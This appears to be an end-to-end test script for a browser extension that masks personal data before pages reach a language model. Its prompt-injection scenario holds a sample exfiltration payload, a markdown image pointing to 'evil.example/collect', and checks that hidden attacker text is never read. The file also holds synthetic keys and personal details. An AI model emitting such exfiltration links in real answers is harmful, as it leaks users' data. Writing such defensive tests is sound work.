"""End-to-end scenario tests for Mintx Assistant.

Loads the real extension in Chromium, opens each synthetic page in samples/, asks a question
through the side panel and checks what the model would receive ("What the model sees").
Starts its own dummy-model server, so no LLM or open port 8765 is needed.

    python assistant/test/scenarios.py            # all layers, including the BERT model
    python assistant/test/scenarios.py --no-neural  # faster; name detection is weaker

The first run downloads the BERT weights (~109 MB) into a reusable test profile.
"""
from __future__ import annotations

import os
import re
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import httpx
from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parents[2]
EXT = ROOT / "assistant"
PORT = 8771
BASE = f"http://127.0.0.1:{PORT}"
NEURAL = "--no-neural" not in sys.argv
# --ner-model <hf-id or local/…>: use a fine-tuned Mintx PII model as the transformer layer
NER_MODEL = sys.argv[sys.argv.index("--ner-model") + 1] if "--ner-model" in sys.argv else ""
PROFILE = Path(tempfile.gettempdir()) / "mintx-scenarios-profile"

results: list[tuple[str, str, bool | None, str]] = []


def check(scenario: str, name: str, ok: bool, detail: str = ""):
    results.append((scenario, name, bool(ok), detail))


def note(scenario: str, name: str, detail: str):
    """A trade-off worth looking at, not a pass/fail requirement."""
    results.append((scenario, name, None, detail))


class Panel:
    def __init__(self, ctx):
        self.ctx = ctx
        self.content = ctx.new_page()
        self.content.goto(f"{BASE}/samples/")
        for _ in range(100):
            if ctx.service_workers:
                break
            self.content.wait_for_timeout(100)
        self.ext = ctx.service_workers[0].url.split("/")[2]
        self.page = ctx.new_page()
        self.page.set_viewport_size({"width": 420, "height": 1000})
        self.page.goto(f"chrome-extension://{self.ext}/panel.html")
        self.errors: list[str] = []
        self.page.on("pageerror", lambda e: self.errors.append(str(e)))

    def open(self, url: str, **settings):
        """Navigate the content tab and start a fresh chat with the given settings."""
        self.content.goto(url)
        tab = self.page.evaluate("u => chrome.tabs.query({}).then(ts => ts.find(t => t.url === u).id)", self.content.url)
        s = {"policy": "balanced", "strategy": "tag", "server": BASE,
             # no flag → the extension's default model; "--ner-model generic" → the CoNLL BERT
             **({"nerChoice": "generic"} if NER_MODEL == "generic" else
                {"nerChoice": "custom", "nerModelId": NER_MODEL} if NER_MODEL else {}),
             "layers": {"rules": True, "secrets": True, "nlp": True, "neural": NEURAL}}
        for k, v in settings.items():
            s["layers" if k == "layers" else k] = {**s["layers"], **v} if k == "layers" else v
        self.page.evaluate("s => Promise.all([chrome.storage.local.set({settings: s}), chrome.storage.session.clear()])", s)
        self.page.goto(f"chrome-extension://{self.ext}/panel.html?tab={tab}")
        self.page.wait_for_selector("#status.ok, #status.bad", timeout=10_000)

    def ask(self, question: str, review: bool = False):
        done_before = self.page.locator(".msg.bot .foot:not(:empty), .msg.error").count()
        if review:
            self.page.check("#review")
        self.page.fill("#input", question)
        self.page.press("#input", "Enter")
        if review:
            self.page.wait_for_selector(".review", timeout=600_000)
            return self.card()
        deadline = time.time() + 600
        while self.page.locator(".msg.bot .foot:not(:empty), .msg.error").count() <= done_before:
            if time.time() > deadline:
                raise TimeoutError("no answer")
            self.page.wait_for_timeout(200)
        return self.card()

    def card(self):
        shield = self.page.locator(".shield").last
        bots = self.page.locator(".msg.bot .bubble")
        return {
            "preview": shield.locator(".preview").text_content() or "",
            "entities": shield.locator(".entities").text_content() or "",
            "notes": shield.locator(".notes").text_content() or "",
            "tokens": shield.locator(".row .token").all_text_contents(),
            "reply_html": bots.last.inner_html() if bots.count() else "",
            "restored": bots.last.locator("mark.restored").count() if bots.count() else 0,
            "error": " ".join(self.page.locator(".msg.error").all_text_contents()),
        }


def hidden(scn, card, values):
    for v in values:
        check(scn, f"hides “{v}”", v not in card["preview"])


def kept(scn, card, values):
    for v in values:
        check(scn, f"keeps “{v}”", v in card["preview"])


def run(p: Panel):
    # 1. Support ticket ------------------------------------------------------------------
    s = "1 Support ticket"
    p.open(f"{BASE}/samples/ticket.html")
    c = p.ask("Draft a short reply to the customer and list what you need from finance.")
    hidden(s, c, ["Priya", "Sharma", "priya.sharma@example.org", "98450 12345", "4111 1111 1111 1111", "2345 6789 0124",
                  "ABCPE1234F", "14/08/1992", "priya.s@okaxis", "GB82 WEST", "sk-proj-", "203.0.113.42",
                  "Rahul Verma", "Arjun Mehta", "42 MG Road"] + (["Meera"] if NEURAL else []))
    kept(s, c, ["Aadhaar", "PAN", "Refund not received", "₹8,499"])
    check(s, "password field never read", "never-read-this" not in c["preview"] + c["entities"])
    a = re.search(r"(\[PERSON_\d+\]) <\[EMAIL_1\]>", c["preview"])
    b = re.search(r"Hi (\[PERSON_\d+\]), thanks", c["preview"])
    check(s, "coreference: one placeholder for Priya", a and b and a.group(1) == b.group(1),
          f"{a and a.group(1)} vs {b and b.group(1)}")
    check(s, "real values restored in answer", c["restored"] > 0, f"{c['restored']} restored")

    # 6. Follow-up keeps the same placeholders ----------------------------------------------
    s = "6 Follow-up memory"
    p.ask("What is her phone number?")
    vault = p.page.evaluate("chrome.storage.session.get('convo').then(r => r.convo.vault.entries)")
    phones = [e["token"] for e in vault if e["type"] == "PHONE"]
    check(s, "one PHONE placeholder across two turns", phones == ["[PHONE_1]"], str(phones))
    check(s, "history stored sanitized", "98450" not in str(p.page.evaluate("chrome.storage.session.get('convo').then(r => r.convo.history)")))

    # 2. Developer log ----------------------------------------------------------------------
    s = "2 Developer log"
    p.open(f"{BASE}/samples/devlog.html")
    c = p.ask("Why did this build fail and how do I fix it?")
    hidden(s, c, ["AKIA4HQ7Z2X9WBN3KD5R", "ghp_x8K2", "S3cretPass!2026", "eyJhbGci", "Vikram", "vikram.nair@example.com"])
    kept(s, c, ["9f3c2e1b7a", "3f6c1a2e-8b4d-4c2e-9f1a-7d5e6b8c9a0b", "3.12.4", "requests==2.31.0",
                "password authentication failed", "OperationalError"])

    # 10. Sensitivity policies on the same page -----------------------------------------------
    s = "10 Sensitivity"
    counts = {}
    for policy in ("strict", "relaxed"):
        p.open(f"{BASE}/samples/devlog.html", policy=policy)
        counts[policy] = len(p.ask("Summarize this page.")["tokens"])
    check(s, "strict masks at least as much as relaxed", counts["strict"] >= counts["relaxed"], str(counts))
    note(s, "values masked per policy", str(counts))

    # 3. Patient form -----------------------------------------------------------------------
    s = "3 Patient form"
    p.open(f"{BASE}/samples/form.html")
    c = p.ask("Check this form for missing or inconsistent details.")
    hidden(s, c, ["Ananya", "Krishnan", "07/03/1988", "90080 77665", "ananya.krishnan@example.net",
                  "17 Residency Road", "90080 11223"] + (["Karthik"] if NEURAL else []))
    kept(s, c, ["migraines", "paracetamol", "Reason for visit"])
    note(s, "insurer name (an organization, not an identifier)", "masked" if "Niva Bupa" not in c["preview"] else "kept")
    check(s, "password field never read", "Migraine#2026" not in c["preview"] + c["entities"])

    # 4. Public article ---------------------------------------------------------------------
    s = "4 Public article"
    p.open(f"{BASE}/samples/article.html")
    c = p.ask("Summarize this article in three bullet points.")
    kept(s, c, ["2016", "13 billion", "40 percent", "Version 2.0", "IFSC", "14 October 2025"])
    note(s, "places and organizations masked (privacy vs. utility)", f"{len(c['tokens'])}: {', '.join(c['tokens'])}")

    # 5. Prompt injection -------------------------------------------------------------------
    s = "5 Prompt injection"
    p.open(f"{BASE}/samples/injection.html")
    c = p.ask("Summarize my order.")
    hidden(s, c, ["Karan", "karan.m@example.net", "99001 23456", "8 Linking Road"])
    check(s, "display:none text never read", "attacker@evil.example" not in c["preview"])
    html = p.page.evaluate("""async () => (await import(chrome.runtime.getURL('markdown.js')))
        .renderMarkdown('![s](https://evil.example/collect?d=x) and [click](https://evil.example)')""")
    check(s, "answers cannot load images or links", "<img" not in html and "<a" not in html)

    # 7. Human review -----------------------------------------------------------------------
    s = "7 Human review"
    p.open(f"{BASE}/samples/ticket.html", layers={"neural": False})
    c = p.ask("Who is the customer?", review=True)
    check(s, "email masked before review", "priya.sharma@example.org" not in c["preview"])
    p.page.locator(".row", has_text="priya.sharma@example.org").locator("button.keep").click()
    after = p.page.locator(".shield .preview").last.text_content()
    check(s, "Share reveals only that value", "priya.sharma@example.org" in after and "98450" not in after)
    p.page.get_by_role("button", name="Send to model").click()
    deadline = time.time() + 60
    while not p.page.locator(".msg.bot .foot:not(:empty), .msg.error").count() and time.time() < deadline:
        p.page.wait_for_timeout(200)
    check(s, "server accepts the user-approved value", not p.page.locator(".msg.error").count(),
          " ".join(p.page.locator(".msg.error").all_text_contents()))

    # 8. Server egress guard ----------------------------------------------------------------
    s = "8 Egress guard"
    p.open(f"{BASE}/samples/ticket.html", layers={"rules": False, "neural": False})
    c = p.ask("Draft a reply.")
    check(s, "server blocks unmasked data", "egress guard" in c["notes"].lower(), c["notes"][:120])
    check(s, "no answer was generated", p.page.locator(".msg.bot").count() == 0)

    # 9. Synthetic surrogates ---------------------------------------------------------------
    s = "9 Synthetic surrogates"
    p.open(f"{BASE}/samples/ticket.html", strategy="synthetic", layers={"neural": False})
    c = p.ask("Draft a reply.")
    check(s, "model sees realistic stand-ins", "user1@example.com" in c["preview"] and "[EMAIL_" not in c["preview"])
    check(s, "real email still hidden", "priya.sharma@example.org" not in c["preview"])

    # 11. Unreadable browser page -----------------------------------------------------------
    s = "11 Unreadable page"
    p.content.goto("chrome://version")
    tab = p.page.evaluate("chrome.tabs.query({url: 'chrome://version/'}).then(t => t[0].id)")
    p.page.goto(f"chrome-extension://{p.ext}/panel.html?tab={tab}")
    c = p.ask("What is this page?")
    check(s, "explains and answers without the page", "without page context" in c["notes"] and not c["error"], c["notes"][:100])

    # 12. Server down -----------------------------------------------------------------------
    s = "12 Server down"
    p.open(f"{BASE}/samples/article.html", server="http://127.0.0.1:9")
    check(s, "status shows offline", p.page.inner_text("#status") == "Server offline")
    c = p.ask("Summarize.")
    check(s, "chat shows an error instead of hanging", bool(c["error"]), c["error"][:80])

    check("All", "no JavaScript errors in the panel", not p.errors, "; ".join(p.errors)[:200])


def main():
    env = {**os.environ, "MINTX_MODE": "dummy"}
    server = subprocess.Popen([sys.executable, "-m", "uvicorn", "server:app", "--host", "127.0.0.1", "--port", str(PORT)],
                              cwd=ROOT, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        for _ in range(50):
            try:
                httpx.get(f"{BASE}/health", timeout=1)
                break
            except httpx.HTTPError:
                time.sleep(0.2)
        with sync_playwright() as pw:
            ctx = pw.chromium.launch_persistent_context(str(PROFILE), headless=True, channel="chromium",
                args=[f"--disable-extensions-except={EXT}", f"--load-extension={EXT}"])
            try:
                run(Panel(ctx))
            finally:
                ctx.close()
    finally:
        server.terminate()

    width = max(len(n) for _, n, _, _ in results)
    current = None
    for scn, name, ok, detail in results:
        if scn != current:
            print(f"\n{scn}")
            current = scn
        label = "NOTE" if ok is None else "PASS" if ok else "FAIL"
        print(f"  {label}  {name.ljust(width)}  {detail if ok is not True else ''}")
    checks = [ok for *_, ok, _ in results if ok is not None]
    failed = checks.count(False)
    model = f" (transformer: {NER_MODEL})" if NER_MODEL else "" if NEURAL else " (BERT layer off)"
    print(f"\n{len(checks) - failed}/{len(checks)} checks passed{model}")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
